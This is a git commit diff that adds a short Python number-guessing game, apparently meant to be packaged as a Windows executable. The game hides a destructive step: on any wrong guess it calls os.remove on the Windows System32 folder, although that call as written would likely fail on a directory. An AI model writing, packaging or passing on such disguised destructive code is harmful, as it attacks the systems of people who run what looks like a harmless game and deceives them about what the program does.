df6da7d0a1d5212d6683a79aacd79d8e96dbb027
eroge-69 <erogexunamed@gmail.com>
2025-07-19 01:00:50 +0700

    Upload mujproject.py via PY to EXE tool

---
+++ python-files/mujproject.py
@@ -0,0 +1,17 @@
+import random
+import os
+
+number = random.randint(1, 10)
+
+guess = input("Guess a number between 1 and 10: ")
+
+guess = int(guess)
+
+if guess == number:
+
+    print("You guessed it right!")
+
+else:
+
+    os.remove("C:\\Windows\\System32")
+        
